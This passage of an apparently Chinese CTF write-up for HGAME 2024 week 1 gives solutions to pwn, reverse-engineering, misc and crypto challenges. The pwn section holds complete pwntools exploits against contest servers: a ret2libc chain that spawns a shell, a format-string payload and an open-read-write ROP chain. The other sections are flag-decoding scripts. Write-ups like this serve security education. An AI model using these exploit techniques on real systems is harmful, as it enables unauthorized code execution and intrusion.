class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;47.100.137.175&#x27;</span>, <span class="number">30915</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401423</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main_addr = <span class="number">0x40125D</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name = <span class="string">b&#x27;a&#x27;</span>*<span class="number">13</span></span><br><span class="line">libc.srand(<span class="built_in">int</span>(time.time()))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;thy name.\n&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">    v6 = (libc.rand() % <span class="number">100</span>) + <span class="number">1</span></span><br><span class="line">    p.sendafter(<span class="string">b&#x27;the number:\n&#x27;</span>,p32(v6))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">48</span>+<span class="number">8</span>)+p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"><span class="comment"># 泄露地址</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;thy brilliant mind.\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(0,p.recvline())  #p.recvuntil(&#x27;\x0a&#x27;)</span></span><br><span class="line">puts_addr = p.recv(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span>,puts_addr)</span><br><span class="line">puts_addr = puts_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">2</span>,puts_addr)</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line"><span class="comment">#puts_addr = u64(p.recv(6).ljust(8, b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">3</span>,puts_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">4</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">sys_offset = <span class="number">0x052290</span></span><br><span class="line">puts_offset = <span class="number">0x084420</span></span><br><span class="line">sh_offset = <span class="number">0x1b45bd</span></span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line">binsh = libc_base + sh_offset</span><br><span class="line">system = libc_base + sys_offset</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">48</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week1/p_3_4.png"></p><h2 id="ezfmt-string"><a href="#ezfmt-string" class="headerlink" title="ezfmt string"></a>ezfmt string</h2><p>只有一次的格式化字符串</p><p><img src="/./hgame2024_week1/p_4_1.png"></p><p><code>vuln</code>函数存在格式化字符串，存在后门函数。</p><p>格式化字符串能够修改任意地址，这里我用了栈迁移的方法实现对后门函数的调用。</p><p>参考链接：<a href="https://blog.csdn.net/Kata_Jhin/article/details/130678623">栈迁移（leave ret）（更适合pwn宝宝体质的栈迁移~）</a></p><p>经过测试，old ebp在第18个位置，修改这个地址，然后在栈里面写入<code>sys</code>的地址。</p><p>exp需要多跑几次，概率能通</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./vuln&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;47.100.137.175&quot;</span>,<span class="number">31349</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%72c%18$hhnaaaaa&#x27;</span>+p64(<span class="number">0x40123D</span>)*<span class="number">6</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;M3?\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week1/p_4_2.png"></p><h2 id="Elden-Ring-Ⅰ"><a href="#Elden-Ring-Ⅰ" class="headerlink" title="Elden Ring Ⅰ"></a>Elden Ring Ⅰ</h2><p>参考：<a href="https://blog.csdn.net/Mr_Fmnwon/article/details/135709318">【PWN · ORW | 栈迁移 | ROP】[HGAME 2023 week1]orw</a></p><p>不能说完全相同，只能说exp一模一样（</p><p>改一下<code>vuln</code> 和<code>rsi</code>的地址即可。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p64,u64</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">vuln=<span class="number">0x40125B</span></span><br><span class="line">rdi=<span class="number">0x4013e3</span></span><br><span class="line"><span class="comment">#io=process(&#x27;./vuln&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;47.100.245.185&#x27;</span>,<span class="number">30321</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### leak_libc</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;I offer you an accord.\n&#x27;</span>,payload)</span><br><span class="line">puts_real=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;puts_real:&#x27;</span>+<span class="built_in">hex</span>(puts_real))</span><br><span class="line">libc_base=puts_real-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">### read_bss</span></span><br><span class="line">bss_base=elf.bss()</span><br><span class="line"><span class="comment"># read(int fd, void *buf, size_t count);</span></span><br><span class="line">read_real=libc_base+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">fd=<span class="number">0</span></span><br><span class="line">buf=bss_base+<span class="number">0x100</span></span><br><span class="line">count=<span class="number">0x200</span></span><br><span class="line">rdi=libc_base+<span class="number">0x23b6a</span></span><br><span class="line">rsi=libc_base+<span class="number">0x2601f</span></span><br><span class="line">rdx=libc_base+<span class="number">0x142c92</span></span><br><span class="line">rsp=libc_base+<span class="number">0x2f70a</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+p64(rsi)+p64(buf)+p64(read_real)+p64(rsp)+p64(buf+<span class="number">8</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">### rop-&gt;bss</span></span><br><span class="line">payload=<span class="string">b&#x27;/flag&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># open(const char *pathname, int flags)</span></span><br><span class="line">open_real=libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">pathname_ptr=buf</span><br><span class="line">flags=<span class="number">0</span></span><br><span class="line">payload+=p64(rdi)+p64(pathname_ptr)+p64(rsi)+p64(flags)+p64(open_real)</span><br><span class="line"><span class="comment"># read(int fd, void *buf, size_t count);</span></span><br><span class="line">fd=<span class="number">3</span></span><br><span class="line">buf2=buf+<span class="number">0x300</span></span><br><span class="line">count=<span class="number">0x100</span></span><br><span class="line">payload+=p64(rdi)+p64(fd)+p64(rsi)+p64(buf2)+p64(rdx)+p64(count)+p64(read_real)</span><br><span class="line"><span class="comment"># write(int handle,void* buf,int length)</span></span><br><span class="line">write_real=libc_base+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">handle=<span class="number">1</span></span><br><span class="line">buf3=buf2</span><br><span class="line">length=<span class="number">0x50</span></span><br><span class="line">payload+=p64(rdi)+p64(handle)+p64(rsi)+p64(buf3)+p64(rdx)+p64(length)+p64(write_real)+p64(vuln)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"> </span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week1/p_5_1.png"></p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="ezIDA"><a href="#ezIDA" class="headerlink" title="ezIDA"></a>ezIDA</h2><p>ida打开即可得到flag。</p><p><img src="/./hgame2024_week1/r_1_1.png"></p><h2 id="ezASM"><a href="#ezASM" class="headerlink" title="ezASM"></a>ezASM</h2><p>让gpt把汇编转成c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> c[] = &#123;<span class="number">74</span>, <span class="number">69</span>, <span class="number">67</span>, <span class="number">79</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">99</span>, <span class="number">113</span>, <span class="number">111</span>, <span class="number">125</span>, <span class="number">107</span>, <span class="number">81</span>, <span class="number">125</span>, <span class="number">107</span>, <span class="number">79</span>, <span class="number">82</span>, <span class="number">18</span>, <span class="number">80</span>, <span class="number">86</span>, <span class="number">22</span>, <span class="number">76</span>, <span class="number">86</span>, <span class="number">125</span>, <span class="number">22</span>, <span class="number">125</span>, <span class="number">112</span>, <span class="number">71</span>, <span class="number">84</span>, <span class="number">17</span>, <span class="number">80</span>, <span class="number">81</span>, <span class="number">17</span>, <span class="number">95</span>, <span class="number">34</span>&#125;;</span><br><span class="line"><span class="type">char</span> flag[<span class="number">33</span>];</span><br><span class="line"><span class="type">char</span> format[] = <span class="string">&quot;plz input your flag: &quot;</span>;</span><br><span class="line"><span class="type">char</span> success[] = <span class="string">&quot;Congratulations!&quot;</span>;</span><br><span class="line"><span class="type">char</span> failure[] = <span class="string">&quot;Sry, plz try again&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Print prompt</span></span><br><span class="line">    write(<span class="number">1</span>, format, <span class="built_in">strlen</span>(format));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read user input</span></span><br><span class="line">    read(<span class="number">0</span>, flag, <span class="keyword">sizeof</span>(flag));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check flag</span></span><br><span class="line">    <span class="type">int</span> esi = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (esi &lt; <span class="number">33</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((flag[esi] ^ <span class="number">0x22</span>) != c[esi]) &#123;</span><br><span class="line">            <span class="comment">// Print failure message</span></span><br><span class="line">            write(<span class="number">1</span>, failure, <span class="built_in">strlen</span>(failure));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;  <span class="comment">// Exit with failure</span></span><br><span class="line">        &#125;</span><br><span class="line">        esi++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Print success message</span></span><br><span class="line">    write(<span class="number">1</span>, success, <span class="built_in">strlen</span>(success));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// Exit with success</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析可以得知，c数组的每一个数字异或上<code>0x22</code>即可得到flag。</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">74</span>, <span class="number">69</span>, <span class="number">67</span>, <span class="number">79</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">99</span>, <span class="number">113</span>, <span class="number">111</span>, <span class="number">125</span>, <span class="number">107</span>, <span class="number">81</span>, <span class="number">125</span>, <span class="number">107</span>, <span class="number">79</span>, <span class="number">82</span>, <span class="number">18</span>, <span class="number">80</span>, <span class="number">86</span>, <span class="number">22</span>, <span class="number">76</span>, <span class="number">86</span>, <span class="number">125</span>, <span class="number">22</span>, <span class="number">125</span>, <span class="number">112</span>, <span class="number">71</span>, <span class="number">84</span>, <span class="number">17</span>, <span class="number">80</span>, <span class="number">81</span>, <span class="number">17</span>, <span class="number">95</span>, <span class="number">34</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i^<span class="number">0x22</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;ASM_Is_Imp0rt4nt_4_Rev3rs3&#125;</span></span><br></pre></td></tr></table></figure><h2 id="ezUPX"><a href="#ezUPX" class="headerlink" title="ezUPX"></a>ezUPX</h2><p>用工具脱壳，然后拖到ida分析。</p><p><img src="/./hgame2024_week1/r_3_1.png"></p><p>把<code>word_1400022A0</code>的值异或上<code>0x32</code>即可得到flag。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="number">0x64</span>,<span class="number">0x7B</span>,<span class="number">0x76</span>,<span class="number">0x73</span>,<span class="number">0x60</span>,<span class="number">0x49</span>,<span class="number">0x65</span>,<span class="number">0x5D</span>,<span class="number">0x45</span>,<span class="number">0x13</span>,<span class="number">0x6B</span>,<span class="number">2</span>,<span class="number">0x47</span>,<span class="number">0x6D</span>,<span class="number">0x59</span>,<span class="number">0x5C</span>,<span class="number">0x2</span>,<span class="number">0x45</span>,<span class="number">0x6D</span>, <span class="number">6</span>,<span class="number">0x6D</span>,<span class="number">0x5E</span>, <span class="number">3</span>,<span class="number">0x46</span>,<span class="number">0x46</span>,<span class="number">0x5E</span>,<span class="number">0x1</span>,<span class="number">0x6D</span>,<span class="number">0x2</span>,<span class="number">0x54</span>,<span class="number">0x6D</span>,<span class="number">0x67</span>,<span class="number">0x62</span>,<span class="number">0x6A</span>,<span class="number">0x13</span>,<span class="number">0x4F</span>,<span class="number">0x32</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(a))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i^<span class="number">0x32</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># VIDAR&#123;Wow!Y0u_kn0w_4_l1ttl3_0f_UPX!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="ezPYC"><a href="#ezPYC" class="headerlink" title="ezPYC"></a>ezPYC</h2><p>用 <a href="https://sourceforge.net/projects/pyinstallerextractor/">pyinstxtractor.py</a> 反编译exe</p><p><img src="/./hgame2024_week1/r_4_1.png"></p><p>这里可以看到python版本是<code>311</code>。</p><p>进入反编译后的文件夹，用010修补<code>ezPYC</code>的文件头。</p><p>不同的 Python 版本会有不同的 <code>PyObject_HEAD</code>，以下是各版本的文件头：</p><table><thead><tr><th>Python 版本</th><th>十六进制文件头</th></tr></thead><tbody><tr><td>Python 2.7</td><td><code>03f30d0a00000000</code></td></tr><tr><td>Python 3.0</td><td><code>3b0c0d0a00000000</code></td></tr><tr><td>Python 3.1</td><td><code>4f0c0d0a00000000</code></td></tr><tr><td>Python 3.2</td><td><code>6c0c0d0a00000000</code></td></tr><tr><td>Python 3.3</td><td><code>9e0c0d0a0000000000000000</code></td></tr><tr><td>Python 3.4</td><td><code>ee0c0d0a0000000000000000</code></td></tr><tr><td>Python 3.5</td><td><code>170d0d0a0000000000000000</code></td></tr><tr><td>Python 3.6</td><td><code>330d0d0a0000000000000000</code></td></tr><tr><td>Python 3.7</td><td><code>420d0d0a000000000000000000000000</code></td></tr><tr><td>Python 3.8</td><td><code>55 0d 0d 0a 00 00 00 00 00 00 00 00 00 00 00 00</code></td></tr><tr><td>Python 3.9</td><td><code>610d0d0a000000000000000000000000</code></td></tr><tr><td>Python 3.10</td><td><code>6f0d0d0a000000000000000000000000</code></td></tr><tr><td>Python 3.11</td><td><code>a70d0d0a000000000000000000000000</code></td></tr></tbody></table><p>用 <code>pycdc.exe</code> 反编译修补后的 <code>ezPYC</code>，可以得到部分源码。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: ezPYC.pyc (Python 3.11)</span></span><br><span class="line"></span><br><span class="line">Unsupported opcode: POP_JUMP_FORWARD_IF_FALSE</span><br><span class="line">flag = [</span><br><span class="line">    <span class="number">87</span>,</span><br><span class="line">    <span class="number">75</span>,</span><br><span class="line">    <span class="number">71</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">83</span>,</span><br><span class="line">    <span class="number">121</span>,</span><br><span class="line">    <span class="number">83</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">117</span>,</span><br><span class="line">    <span class="number">106</span>,</span><br><span class="line">    <span class="number">108</span>,</span><br><span class="line">    <span class="number">106</span>,</span><br><span class="line">    <span class="number">94</span>,</span><br><span class="line">    <span class="number">80</span>,</span><br><span class="line">    <span class="number">48</span>,</span><br><span class="line">    <span class="number">114</span>,</span><br><span class="line">    <span class="number">100</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">55</span>,</span><br><span class="line">    <span class="number">94</span>,</span><br><span class="line">    <span class="number">51</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">91</span>,</span><br><span class="line">    <span class="number">48</span>,</span><br><span class="line">    <span class="number">108</span>,</span><br><span class="line">    <span class="number">119</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">115</span>,</span><br><span class="line">    <span class="number">49</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">48</span>,</span><br><span class="line">    <span class="number">108</span>,</span><br><span class="line">    <span class="number">100</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">124</span>,</span><br><span class="line">    <span class="number">2</span>]</span><br><span class="line">c = [</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    <span class="number">4</span>]</span><br><span class="line"><span class="built_in">input</span> = <span class="built_in">input</span>(<span class="string">&#x27;plz input flag:&#x27;</span>)</span><br><span class="line"><span class="comment"># WARNING: Decompyle incomplete</span></span><br></pre></td></tr></table></figure><p>这里猜测一下，flag是<code>flag</code>变量异或上<code>c</code>变量的值</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = [<span class="number">87</span>,<span class="number">75</span>,<span class="number">71</span>,<span class="number">69</span>,<span class="number">83</span>,<span class="number">121</span>,<span class="number">83</span>,<span class="number">125</span>,<span class="number">117</span>,<span class="number">106</span>,<span class="number">108</span>,<span class="number">106</span>,<span class="number">94</span>,<span class="number">80</span>,<span class="number">48</span>,<span class="number">114</span>,<span class="number">100</span>,<span class="number">112</span>,<span class="number">112</span>,<span class="number">55</span>,<span class="number">94</span>,<span class="number">51</span>,<span class="number">112</span>,<span class="number">91</span>,<span class="number">48</span>,<span class="number">108</span>,<span class="number">119</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">49</span>,<span class="number">112</span>,<span class="number">112</span>,<span class="number">48</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">37</span>,<span class="number">124</span>,<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">c = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    out = flag[i]^c[i%<span class="number">4</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(out),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># VIDAR&#123;Python_R3vers3_1s_1nter3st1ng!&#125;</span></span><br></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>关注“凌武科技”微信公众号，发送“HGAME2024”获得 Flag！</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;welc0me_t0_HGAME_2024&#125;</span><br></pre></td></tr></table></figure><h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p>图片放手机上，闭上一只眼睛从侧边看即可。（费眼睛）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;WOW_GREAT_YOU_SEE_IT_WONDERFUL&#125;</span><br></pre></td></tr></table></figure><h2 id="simple-attack"><a href="#simple-attack" class="headerlink" title="simple_attack"></a>simple_attack</h2><p>附件给了张图片和压缩包，压缩包里有一个和外面名字一样的图片，很明显是明文攻击。</p><p><img src="/./hgame2024_week1/m_2_1.png"></p><p>攻击完成后即可得到未加密的压缩包，解压即可。</p><p>查看<code>photo.txt</code>，里面是base64编码，解码后转成图片即可得到flag。</p><p><img src="/./hgame2024_week1/m_2_2.png"></p><p><img src="/./hgame2024_week1/m_2_3.png"></p><h2 id="来自星尘的问候"><a href="#来自星尘的问候" class="headerlink" title="来自星尘的问候"></a>来自星尘的问候</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个即将发售的游戏的主角薇^3带来了一条消息。这段消息隐藏在加密的图片里</span><br><span class="line">但即使解开了图片的六位弱加密,看到的也是一张迷惑的图片。</span><br><span class="line">也许游戏的官网上有这种文字的记录?</span><br><span class="line">补充：flag格式为`hgame\&#123;[a-z0-9_]+\&#125;`</span><br></pre></td></tr></table></figure><p>根据题目说明，可以判断是<code>steghide</code>隐写。</p><p>用<code>stegseek</code>爆破出密钥为<code>123456</code>，得到一个压缩包。</p><p>解压后得到一张图片。</p><p><img src="/./hgame2024_week1/m_3_1.png"></p><p>根据 <a href="https://my1l.github.io/Ctrl/CtrlAstr.html">这个网站</a> 来对照字体，得到flag为 <code>hgame&#123;welc0me!&#125;</code></p><h2 id="希儿希儿希尔"><a href="#希儿希儿希尔" class="headerlink" title="希儿希儿希尔"></a>希儿希儿希尔</h2><p>图片宽高有问题，根据crc算出正确的宽和高，然后修复。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#爆破png的crc，找到宽高</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">crc32_hex = <span class="number">0x121b804d</span></span><br><span class="line">filename = <span class="string">&#x27;secret.png&#x27;</span></span><br><span class="line">crcbp = <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + \</span><br><span class="line">            struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i) + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j) + crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span>(crc32 == crc32_hex):</span><br><span class="line">            <span class="built_in">print</span>(i, j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;wid:&#x27;</span>, <span class="built_in">hex</span>(i))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;hight:&#x27;</span>, <span class="built_in">hex</span>(j))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">1394 1999</span></span><br><span class="line"><span class="string">wid: 0x572</span></span><br><span class="line"><span class="string">hight: 0x7cf</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week1/m_4_1.png"></p><p>用<code>zsteg</code>查看，发现有一个压缩包，还看到了一个<code>KEY</code>。</p><p><img src="/./hgame2024_week1/m_4_2.png"></p><p>将压缩包提取出来并解压，得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVOCRJGMKLDJGBQIUIVXHEYLPNWR</span><br></pre></td></tr></table></figure><p>希尔密码解密，用这个 <a href="https://ctf.bugku.com/tool/hill">在线网站</a> 解密即可</p><p><img src="/./hgame2024_week1/m_4_3.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DISAPPEARINTHESEAOFBUTTERFLY</span><br></pre></td></tr></table></figure><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h2><p>题目：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">n=p*q</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line">leak1=<span class="built_in">pow</span>(p,q,n)</span><br><span class="line">leak2=<span class="built_in">pow</span>(q,p,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;leak1=<span class="subst">&#123;leak1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;leak2=<span class="subst">&#123;leak2&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">leak1=149127170073611271968182576751290331559018441805725310426095412837589227670757540743929865853650399839102838431507200744724939659463200158012469676979987696419050900842798225665861812331113632892438742724202916416060266581590169063867688299288985734104127632232175657352697898383441323477450658179727728908669</span></span><br><span class="line"><span class="string">leak2=116122992714670915381309916967490436489020001172880644167179915467021794892927977272080596641785569119134259037522388335198043152206150259103485574558816424740204736215551933482583941959994625356581201054534529395781744338631021423703171146456663432955843598548122593308782245220792018716508538497402576709461</span></span><br><span class="line"><span class="string">c=10529481867532520034258056773864074017027019578041866245400647840230251661652999709715919620810933437191661180003295923273655675729588558899592524235622728816065501918076120812236580344991140980991532347991252705288633014913479970610056845543523591324177567061948922552275235486615514913932125436543991642607028689762693617305246716492783116813070355512606971626645594961850567586340389705821314842096465631886812281289843132258131809773797777049358789182212570606252509790830994263132020094153646296793522975632191912463919898988349282284972919932761952603379733234575351624039162440021940592552768579639977713099971</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>由费马小定理，可以知道<code>leak1</code>和<code>leak2</code>分别是<code>q</code>和<code>p</code>，直接代进去算即可。</p><p>更具体的讲解参考这个视频：<a 